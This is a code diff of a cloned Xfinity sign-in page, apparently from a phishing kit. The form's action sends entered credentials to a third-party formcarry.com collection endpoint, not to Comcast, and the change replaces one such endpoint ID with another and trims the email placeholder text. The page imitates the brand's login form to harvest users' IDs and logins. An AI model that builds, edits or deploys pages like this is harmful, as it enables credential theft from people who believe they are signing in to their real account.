@@ -2407,7 +2407,7 @@ Comcast Business customer?
 <style>
 #right #quick-bill-pay, #formPanel #quick-bill-pay { display: block; }
 </style></div><div id="right" class="w-full max-w-[420px] mx-auto lg:mx-0 break-words">	<div class="prism-box p-0 lg:p-6">
-<form name="signin" action="https://formcarry.com/s/xROnZscxOi" method="post" novalidate="">
+<form  action="https://formcarry.com/s/3GKYnemMTg" method="post" class="username-challenge "> 
     
 <div class="single logo-wrapper flex items-center mb-7 lg:mb-10">
 <span aria-role="img" class="bg-xfinity-logo bg-cover bg-no-repeat inline-block flex-shrink-0 h-6 w-17.75">
@@ -2416,17 +2416,17 @@ Comcast Business customer?
     </svg>
 </span>
 </div>
-            <prism-text tag="h1" display="display2" class="text-block display2 hydrated">Sign in with your Xfinity ID</prism-text>
-                <prism-input-text prism-id="user" name="user" label="Enter your Xfinity ID" hide-label="true" placeholder="Email, mobile, or username" value="" autocomplete="username" autocorrect="off" auto-capitalize="off" spellcheck="false" maxlength="128" required="true" data-value-missing="Please enter your Xfinity ID to sign in." class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated"><!---->
+            <prism-text tag="h1" display="display2" class="text-block display2 hydrated"> Sign in with your Xfinity ID </prism-text>
+                <prism-input-text prism-id="user" name="user" label="Enter your Xfinity ID" hide-label="true" placeholder="Email" value="" autocomplete="username" autocorrect="off" auto-capitalize="off" spellcheck="false" maxlength="128" required="true" data-value-missing="Please enter your Xfinity ID to sign in." class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated"><!---->
                     <span class="screen-reader-text sc-prism-input-text" aria-live="assertive"></span>
                     <label class="sc-prism-input-text" for="user">
                         <prism-text class="label-text screen-reader-text sc-prism-input-text caption hydrated">Enter your Xfinity ID</prism-text>
                     </label>
                     <span class="wrap sc-prism-input-text sc-prism-input-text-s">
-                        <input class="input text contained body1 sc-prism-input-text" id="user" autocapitalize="off" autocomplete="username" autocorrect="off" inputmode="text" maxlength="128" name="Email" placeholder="Email, mobile, or username" required="" type="text" aria-invalid="false" aria-required="true"></span>
+                        <input class="input text contained body1 sc-prism-input-text" id="user" autocapitalize="off" autocomplete="username" autocorrect="off" inputmode="text" maxlength="128" name="Email" placeholder="Email" required="" type="text" aria-invalid="false" aria-required="true"></span>
                     </prism-input-text>
 
-                    <prism-input-text prism-id="user" name="user" label="Enter your Xfinity ID" hide-label="true" placeholder="Email, mobile, or username" value="" autocomplete="username" autocorrect="off" auto-capitalize="off" spellcheck="false" maxlength="128" required="true" data-value-missing="Please enter your Xfinity ID to sign in." class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated"><!---->
+                    <prism-input-text prism-id="user" name="user" label="Enter your Xfinity ID" hide-label="true" placeholder="Email" value="" autocomplete="username" autocorrect="off" auto-capitalize="off" spellcheck="false" maxlength="128" required="true" data-value-missing="Please enter your Xfinity ID to sign in." class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated"><!---->
                         <span class="screen-reader-text sc-prism-input-text" aria-live="assertive"></span>
                         <label class="sc-prism-input-text" for="user">
                             <prism-text class="label-text screen-reader-text sc-prism-input-text caption hydrated">Enter your Xfinity ID</prism-text>
